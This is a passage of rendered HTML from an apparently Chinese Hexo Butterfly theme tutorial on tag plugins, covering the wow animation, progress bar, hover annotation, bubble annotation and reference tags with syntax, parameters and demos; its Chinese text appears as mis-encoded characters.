xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-ç‰¹æ•ˆæ ‡ç­¾wow">2.24 ç‰¹æ•ˆæ ‡ç­¾wow</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">å†…å®¹</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>animate</code>: åŠ¨ç”»æ ·å¼ï¼Œæ•ˆæœè¯¦è§<a href="https://animate.style/">animate.csså‚è€ƒæ–‡æ¡£</a></li><li><code>duration</code>: é€‰å¡«é¡¹ï¼ŒåŠ¨ç”»æŒç»­æ—¶é—´ï¼Œå•ä½å¯ä»¥æ˜¯<code>ms</code>ä¹Ÿå¯ä»¥æ˜¯<code>s</code>ã€‚ä¾‹å¦‚<code>3s</code>ï¼Œ<code>700ms</code>ã€‚</li><li><code>delay</code>: é€‰å¡«é¡¹ï¼ŒåŠ¨ç”»å¼€å§‹çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½å¯ä»¥æ˜¯<code>ms</code>ä¹Ÿå¯ä»¥æ˜¯<code>s</code>ã€‚ä¾‹å¦‚<code>3s</code>ï¼Œ<code>700ms</code>ã€‚</li><li><code>offset</code>: é€‰å¡«é¡¹ï¼Œå¼€å§‹åŠ¨ç”»çš„è·ç¦»ï¼ˆç›¸å¯¹æµè§ˆå™¨åº•éƒ¨ï¼‰</li><li><code>iteration</code>: é€‰å¡«é¡¹ï¼ŒåŠ¨ç”»é‡å¤çš„æ¬¡æ•°</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.flipåŠ¨ç”»æ•ˆæœã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`åŠ¨ç”»æ•ˆæœï¼ŒæŒç»­`5s`ï¼Œå»¶æ—¶`5s`ï¼Œç¦»åº•éƒ¨`100`è·ç¦»æ—¶å¯åŠ¨ï¼Œé‡å¤`10`æ¬¡</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomInåŠ¨ç”»æ•ˆæœï¼ŒæŒç»­5sï¼Œå»¶æ—¶5sï¼Œç¦»åº•éƒ¨100è·ç¦»æ—¶å¯åŠ¨ï¼Œé‡å¤10æ¬¡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`åŠ¨ç”»æ•ˆæœï¼ŒæŒç»­`5s`ï¼Œå»¶æ—¶`5s`ï¼Œç¦»åº•éƒ¨`100`è·ç¦»æ—¶å¯åŠ¨ï¼Œé‡å¤`10`æ¬¡</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRightåŠ¨ç”»æ•ˆæœï¼ŒæŒç»­5sï¼Œå»¶æ—¶5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`åŠ¨ç”»æ•ˆæœï¼ŒæŒç»­`5s`ï¼Œå»¶æ—¶`5s`ã€‚</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeatåŠ¨ç”»æ•ˆæœï¼Œå»¶æ—¶5sï¼Œé‡å¤10æ¬¡ã€‚æ­¤å¤„æ³¨æ„ä¸ç”¨çš„å‚æ•°ä½ç½®è¦ç•™ç©ºï¼Œç”¨é€—å·é—´éš”ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`åŠ¨ç”»æ•ˆæœï¼Œå»¶æ—¶`5s`ï¼Œé‡å¤`10`æ¬¡ã€‚</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.flipåŠ¨ç”»æ•ˆæœã€‚</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>åŠ¨ç”»æ•ˆæœï¼ŒæŒç»­<code>5s</code>ï¼Œå»¶æ—¶<code>5s</code>ï¼Œç¦»åº•éƒ¨<code>100</code>è·ç¦»æ—¶å¯åŠ¨ï¼Œé‡å¤<code>10</code>æ¬¡</p></div></div><p>2.zoomInåŠ¨ç”»æ•ˆæœï¼ŒæŒç»­5sï¼Œå»¶æ—¶5sï¼Œç¦»åº•éƒ¨100è·ç¦»æ—¶å¯åŠ¨ï¼Œé‡å¤10æ¬¡</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>åŠ¨ç”»æ•ˆæœï¼ŒæŒç»­<code>5s</code>ï¼Œå»¶æ—¶<code>5s</code>ï¼Œç¦»åº•éƒ¨<code>100</code>è·ç¦»æ—¶å¯åŠ¨ï¼Œé‡å¤<code>10</code>æ¬¡</p></div></div><p>3.slideInRightåŠ¨ç”»æ•ˆæœï¼ŒæŒç»­5sï¼Œå»¶æ—¶5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>åŠ¨ç”»æ•ˆæœï¼ŒæŒç»­<code>5s</code>ï¼Œå»¶æ—¶<code>5s</code>ã€‚</p></div></div><p>4.heartBeatåŠ¨ç”»æ•ˆæœï¼Œå»¶æ—¶5sï¼Œé‡å¤10æ¬¡ã€‚æ­¤å¤„æ³¨æ„ä¸ç”¨çš„å‚æ•°ä½ç½®è¦ç•™ç©ºï¼Œç”¨é€—å·é—´éš”ã€‚</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>åŠ¨ç”»æ•ˆæœï¼Œå»¶æ—¶<code>5s</code>ï¼Œé‡å¤<code>10</code>æ¬¡ã€‚</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-è¿›åº¦æ¡-progress">2.25  è¿›åº¦æ¡ progress</h2><div class="note info flat"><p>è¿›åº¦æ¡æ ‡ç­¾å‚è€ƒ<a href="https://rongbuqiu.com/jdt.html">æ²‚ä½°å­œçŒ«-ç»™HEXOæ–‡ç« æ·»åŠ å½©è‰²è¿›åº¦æ¡</a>ã€‚<br>æºæ ·å¼æå–è‡ª<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>ä¸»é¢˜ã€‚</p></div><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>width</code>: 0åˆ°100çš„é˜¿æ‹‰ä¼¯æ•°å­—</li><li><code>color</code>: é¢œè‰²ï¼Œå–å€¼æœ‰red,yellow,green,cyan,blue,gray</li><li><code>text</code>:è¿›åº¦æ¡ä¸Šçš„æ–‡å­—å†…å®¹</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red è¿›åº¦æ¡æ ·å¼é¢„è§ˆ %&#125;</span><br><span class="line">&#123;% progress 30 yellow è¿›åº¦æ¡æ ·å¼é¢„è§ˆ %&#125;</span><br><span class="line">&#123;% progress 50 green è¿›åº¦æ¡æ ·å¼é¢„è§ˆ %&#125;</span><br><span class="line">&#123;% progress 70 cyan è¿›åº¦æ¡æ ·å¼é¢„è§ˆ %&#125;</span><br><span class="line">&#123;% progress 90 blue è¿›åº¦æ¡æ ·å¼é¢„è§ˆ %&#125;</span><br><span class="line">&#123;% progress 100 gray è¿›åº¦æ¡æ ·å¼é¢„è§ˆ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>è¿›åº¦æ¡æ ·å¼é¢„è§ˆ</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>è¿›åº¦æ¡æ ·å¼é¢„è§ˆ</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>è¿›åº¦æ¡æ ·å¼é¢„è§ˆ</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>è¿›åº¦æ¡æ ·å¼é¢„è§ˆ</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>è¿›åº¦æ¡æ ·å¼é¢„è§ˆ</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>è¿›åº¦æ¡æ ·å¼é¢„è§ˆ</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-æ³¨é‡Š-notation">2.26 æ³¨é‡Š notation</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><p><code>label</code>: æ³¨é‡Šè¯æ±‡</p></li><li><p><code>text</code>: æ‚¬åœæ˜¾ç¤ºçš„æ³¨è§£å†…å®¹</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota æŠŠé¼ æ ‡ç§»åŠ¨åˆ°æˆ‘ä¸Šé¢è¯•è¯• ,å¯ä»¥çœ‹åˆ°æ³¨è§£å†…å®¹å‡ºç°åœ¨é¡¶æ  %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p><span class='nota' data-nota='å¯ä»¥çœ‹åˆ°æ³¨è§£å†…å®¹å‡ºç°åœ¨é¡¶æ '>æŠŠé¼ æ ‡ç§»åŠ¨åˆ°æˆ‘ä¸Šé¢è¯•è¯•</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-æ°”æ³¡æ³¨é‡Š-bubble">2.27 æ°”æ³¡æ³¨é‡Š bubble</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>content</code>: æ³¨é‡Šè¯æ±‡</li><li><code>notation</code>: æ‚¬åœæ˜¾ç¤ºçš„æ³¨è§£å†…å®¹</li><li><code>background-color</code>: å¯é€‰ï¼Œæ°”æ³¡èƒŒæ™¯è‰²ã€‚é»˜è®¤ä¸ºâ€œ#71a4e3â€</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ€è¿‘æˆ‘å­¦åˆ°äº†ä¸å°‘æ–°ç©æ„å„¿ï¼ˆè™½ç„¶å¯¹å¾ˆå¤šå¤§ä½¬æ¥è¯´è¿™äº›å·²ç»æ˜¯æ—§æŠ€æœ¯äº†ï¼‰ï¼Œæ¯”å¦‚CSSçš„&#123;% bubble å…„å¼Ÿç›¸é‚»é€‰æ‹©å™¨,&quot;ä¾‹å¦‚ h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;ï¼Œ&#123;% bubble flexå¸ƒå±€,&quot;Flex æ˜¯ Flexible Box çš„ç¼©å†™ï¼Œæ„ä¸º&quot;å¼¹æ€§å¸ƒå±€&quot;ï¼Œç”¨æ¥ä¸ºç›’çŠ¶æ¨¡å‹æä¾›æœ€å¤§çš„çµæ´»æ€§&quot;,&quot;#ec5830&quot; %&#125;ï¼Œ&#123;% bubble transformå˜æ¢,&quot;transform å±æ€§å‘å…ƒç´ åº”ç”¨ 2D æˆ– 3D è½¬æ¢ã€‚è¯¥å±æ€§å…è®¸æˆ‘ä»¬å¯¹å…ƒç´ è¿›è¡Œæ—‹è½¬ã€ç¼©æ”¾ã€ç§»åŠ¨æˆ–å€¾æ–œã€‚&quot;,&quot;#1db675&quot; %&#125;ï¼Œanimationçš„&#123;% bubble è´å¡å°”é€Ÿåº¦æ›²çº¿,&quot;è´å¡å°”æ›²çº¿(BÃ©zier curve)ï¼Œåˆç§°è´å…¹æ›²çº¿æˆ–è´æµåŸƒæ›²çº¿ï¼Œæ˜¯åº”ç”¨äºäºŒç»´å›¾å½¢åº”ç”¨ç¨‹åºçš„æ•°å­¦æ›²çº¿ã€‚ä¸€èˆ¬çš„çŸ¢é‡å›¾å½¢è½¯ä»¶é€šè¿‡å®ƒæ¥ç²¾ç¡®ç”»å‡ºæ›²çº¿ï¼Œè´å…¹æ›²çº¿ç”±çº¿æ®µä¸èŠ‚ç‚¹ç»„æˆï¼ŒèŠ‚ç‚¹æ˜¯å¯æ‹–åŠ¨çš„æ”¯ç‚¹ï¼Œçº¿æ®µåƒå¯ä¼¸ç¼©çš„çš®ç­‹&quot;,&quot;#de4489&quot; %&#125;å†™æ³•ï¼Œè¿˜æœ‰ä»Šå¤©åˆšçœ‹åˆ°çš„&#123;% bubble clip-path,&quot;clip-pathå±æ€§ä½¿ç”¨è£å‰ªæ–¹å¼åˆ›å»ºå…ƒç´ çš„å¯æ˜¾ç¤ºåŒºåŸŸã€‚åŒºåŸŸå†…çš„éƒ¨åˆ†æ˜¾ç¤ºï¼ŒåŒºåŸŸå¤–çš„éšè—ã€‚&quot;,&quot;#868fd7&quot; %&#125;å±æ€§ã€‚è¿™äº›å¯¹æˆ‘æ¥è¯´å¾ˆæ–°é¢–çš„æ¦‚å¿µç‹ ç‹ çš„å†²å‡»ç€æˆ‘ä»¥å‰ç§¯ç´¯èµ·æ¥çš„è®¾è®¡æ€è·¯ã€‚</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>æœ€è¿‘æˆ‘å­¦åˆ°äº†ä¸å°‘æ–°ç©æ„å„¿ï¼ˆè™½ç„¶å¯¹å¾ˆå¤šå¤§ä½¬æ¥è¯´è¿™äº›å·²ç»æ˜¯æ—§æŠ€æœ¯äº†ï¼‰ï¼Œæ¯”å¦‚CSSçš„<span class="bubble-content">å…„å¼Ÿç›¸é‚»é€‰æ‹©å™¨</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">ä¾‹å¦‚ h1 + p {margin-top:50px;}</span></span>ï¼Œ<span class="bubble-content">flexå¸ƒå±€</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex æ˜¯ Flexible Box çš„ç¼©å†™ï¼Œæ„ä¸ºå¼¹æ€§å¸ƒå±€&quot;ï¼Œç”¨æ¥ä¸ºç›’çŠ¶æ¨¡å‹æä¾›æœ€å¤§çš„çµæ´»æ€§&quot;</span></span>ï¼Œ<span class="bubble-content">transformå˜æ¢</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform å±æ€§å‘å…ƒç´ åº”ç”¨ 2D æˆ– 3D è½¬æ¢ã€‚è¯¥å±æ€§å…è®¸æˆ‘ä»¬å¯¹å…ƒç´ è¿›è¡Œæ—‹è½¬ã€ç¼©æ”¾ã€ç§»åŠ¨æˆ–å€¾æ–œã€‚</span></span>ï¼Œanimationçš„<span class="bubble-content">è´å¡å°”é€Ÿåº¦æ›²çº¿</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">è´å¡å°”æ›²çº¿(BÃ©zier curve)ï¼Œåˆç§°è´å…¹æ›²çº¿æˆ–è´æµåŸƒæ›²çº¿ï¼Œæ˜¯åº”ç”¨äºäºŒç»´å›¾å½¢åº”ç”¨ç¨‹åºçš„æ•°å­¦æ›²çº¿ã€‚ä¸€èˆ¬çš„çŸ¢é‡å›¾å½¢è½¯ä»¶é€šè¿‡å®ƒæ¥ç²¾ç¡®ç”»å‡ºæ›²çº¿ï¼Œè´å…¹æ›²çº¿ç”±çº¿æ®µä¸èŠ‚ç‚¹ç»„æˆï¼ŒèŠ‚ç‚¹æ˜¯å¯æ‹–åŠ¨çš„æ”¯ç‚¹ï¼Œçº¿æ®µåƒå¯ä¼¸ç¼©çš„çš®ç­‹</span></span>å†™æ³•ï¼Œè¿˜æœ‰ä»Šå¤©åˆšçœ‹åˆ°çš„<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-pathå±æ€§ä½¿ç”¨è£å‰ªæ–¹å¼åˆ›å»ºå…ƒç´ çš„å¯æ˜¾ç¤ºåŒºåŸŸã€‚åŒºåŸŸå†…çš„éƒ¨åˆ†æ˜¾ç¤ºï¼ŒåŒºåŸŸå¤–çš„éšè—ã€‚</span></span>å±æ€§ã€‚è¿™äº›å¯¹æˆ‘æ¥è¯´å¾ˆæ–°é¢–çš„æ¦‚å¿µç‹ ç‹ çš„å†²å‡»ç€æˆ‘ä»¥å‰ç§¯ç´¯èµ·æ¥çš„è®¾è®¡æ€è·¯ã€‚</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-å¼•ç”¨æ–‡çŒ®-reference">2.28 å¼•ç”¨æ–‡çŒ® reference</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><p>referto å¼•ç”¨ä¸Šæ ‡</p><ul><li><p><code>id</code>: ä¸Šæ ‡åºå·å†…å®¹ï¼Œéœ€ä¸referfromæ ‡ç­¾çš„idå¯¹åº”æ‰èƒ½å®ç°è·³è½¬</p></li><li><p><code>literature</code>: å¼•ç”¨çš„å‚è€ƒæ–‡çŒ®åç§°</p></li></ul></li><li><p>referfrom å¼•ç”¨å‡ºå¤„</p><ul><li><p><code>id</code>: åºå·å†…å®¹ï¼Œéœ€ä¸refertoæ ‡ç­¾çš„idå¯¹åº”æ‰èƒ½å®ç° è·³è½¬</p></li><li><p><code>literature</code>: å¼•ç”¨çš„å‚è€ƒæ–‡çŒ®åç§°</p></li><li><p><code>url</code>: å¼•ç”¨çš„å‚è€ƒæ–‡çŒ®é“¾æ¥ï¼Œå¯çœç•¥</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarã®ç³–æœå±‹(akilar.top)æ˜¯ä¸€ä¸ªç§äººæ€§è´¨çš„åšå®¢&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarã®ç³–æœå±‹ç¾¤èŠç®€ä»‹&#x27; %&#125;ï¼Œä»å„ç±»æ•™ç¨‹è‡³ç”Ÿæ´»ç‚¹æ»´ï¼Œæ— è¯ä¸è°ˆã€‚å»ºç¾¤çš„ç›®çš„æ˜¯æä¾›ä¸€ä¸ªé—²èŠçš„åœºæ‰€ã€‚åšå®¢é‡‡ç”¨Hexoæ¡†æ¶&#123;% referto &#x27;[2]&#x27;,&#x27;Hexoä¸­æ–‡æ–‡æ¡£&#x27; %&#125;ï¼ŒButterflyä¸»é¢˜&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly å®‰è£…æ–‡æ¡£(ä¸€) å¿«é€Ÿå¼€å§‹&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">æœ¬é¡¹ç›®å‚è€ƒäº†Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis æ ‡ç­¾æ’ä»¶&#x27; %&#125;çš„æ ‡ç­¾æ ·å¼ã€‚å¼•å…¥<span class="code">`[tag].js`</span>ï¼Œå¹¶é’ˆå¯¹<span class="code">`butterfly`</span>ä¸»é¢˜ä¿®æ”¹äº†ç›¸åº”çš„<span class="code">`[tag].styl`</span>ã€‚åœ¨æ­¤é¸£è°¢<span 